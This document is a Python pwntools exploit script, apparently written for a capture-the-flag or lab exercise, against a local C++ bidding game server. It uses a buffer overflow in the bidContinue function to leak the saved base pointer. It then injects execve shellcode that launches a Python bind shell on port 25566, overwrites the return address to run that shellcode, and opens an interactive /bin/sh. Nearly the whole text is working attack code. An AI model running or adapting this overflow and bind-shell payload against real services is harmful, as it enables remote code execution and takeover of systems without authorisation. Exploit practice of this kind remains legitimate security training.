#!/usr/bin/env python3
from pwn import *

log = success # alias
bin_fname = "./build/game"
context.binary = bin_fname

"""
C++ this pointer is first argument in SystemV ABI

Disassemble program using
objdump -Cd -M intel --visualize-jumps=extended-color --no-show-raw-insn [prog]

Look at specific functions of interest
grep '<bid(sock\*, Player<5>\*)>:' -A 113
grep '<bidContinue(sock\*, Player<5>\*)>:' -A 94
grep '<gameloop()>:' -A 392
"""

io = None
def reconnect():
    global io
    if io is not None:
        io.close()
    io = remote("localhost", 25565)

# Buffer Overflow - Shellcode injection
# bidContinue (BoF) local variables:
# *s @ [rbp-0x58], *user @ [rbp-0x60]
# success @ [rbp-0x11]
# slotBids @ [rbp-0x18], oldBal @ [rbp-0x1c], newBal @ [rbp-0x20]
# response[3] @ [rbp-0x23]
def bid(slot: int, amount: int, query: list[int] = []) -> list[int]:
    prize = []  # type: list[int]
    for i in query:
        io.recvuntil(b"Slot?\n")
        io.sendline(str(i).encode())
        val = io.recvline(False).split(b":", 1)[1].decode()
        prize.append(int(val))
    io.sendlineafter(b"Slot?\n", b"Done")

    io.recvuntil(b"Slot:\n")
    io.sendline(str(slot).encode())
    io.recvuntil(b"Gems:\n")
    io.sendline(str(amount).encode())

    return prize


def bidContinue(response: bytes = b"Y") -> tuple[list[bytes], bytes]:
    user_data = [io.recvline(False) for _ in range(3)]
    io.sendline(response)

    err_data = b"" if response[0] in b"YyNn" else io.recvuntil(b"'\n")

    return user_data, err_data

#
# Start exploit
#
reconnect()

# Leak stack address via base pointer

bid(0, 1)   # Only to advance to next prompt
responses = bidContinue(b"\x01" * 0x22) # BoF up to base pointer with newline

log(f"user data = {responses[0]}")
log(f"error res = {responses[1]}")

rbp_raw = responses[1].split(b"\n", 1)[1].rsplit(b"'")[0]
rbp = u64(rbp_raw.ljust(8, b"\x00"))

log(f"rbp raw = {rbp_raw}")
log(f"rbp val = 0x{rbp:02x}")

assert len(rbp_raw) >= 6    # Expected rbp size

# Reconnect and skip a round
# For some reason, same stack is used every second time (usually)
reconnect()
bid(0, 1)
bidContinue()
reconnect()

# Generate shellcode to launch a python bind shell via linux syscall
# execve("/bin/python", *char[]{"-c", "...", NULL}, NULL)
# Reference: https://blog.atucom.net/2017/06/smallest-python-bind-shell.html
BIND_PORT = 25566
BIND_SHELL = [
    f"import socket as s;a=s.socket();a.bind(('127.1',{BIND_PORT}));a.listen(1);r,z=a.accept();exec(r.recv(99))",
    "import subprocess as p;p.run('/bin/sh',stdin=r,stdout=r,stderr=r);a.close()"
]
asm_shell = f"""
push 0
call arg1
.asciz "{BIND_SHELL[0]}"
arg1:
call arg0
.asciz "-c"
arg0:
call code
.asciz "/bin/python"
code:
push rsp
pop rsi
pop rdi
xor edx, edx
mov eax, 59
syscall
"""
shellcode = asm(asm_shell)  # type: bytes
log(f"Compiled into {len(shellcode)} bytes")

# Calculate frame base from leaked rbp (this points to previous frame)
# Since bidContinue is called from std::async(), use offset found via gdb
# Returns to this C++ internal function
#   template<typename _Res, typename _Fn, typename... _Args>
#   constexpr _Res __invoke_impl(__invoke_other, _Fn&& __f, _Args&&... __args)
# which reserves 0x30 stack space
frame = rbp - 0x40  # 0x20 from previous frame + 8 for rbp + 8 for ret addr
shellcode_pos = frame + 0x10
log(f"frame = 0x{frame:02x}")
log(f"jmp to = 0x{shellcode_pos:02x}")

# Build payload such that [junk][rbp][shellcode_pos][nop][shellcode]
payload = b"\x01" * 0x23
payload += p64(rbp)
payload += p64(shellcode_pos)
# payload += asm("nop") * 0x8    # Unnecessary if everything is correct
payload += shellcode

bid(0, 1)      # Only to advance to next prompt
bidContinue(payload)

# Connect to the bind shell
io.close()
pause(3)    # Wait for bind shell to start up
io = remote("localhost", BIND_PORT)
io.sendline(BIND_SHELL[1].encode())

io.interactive()
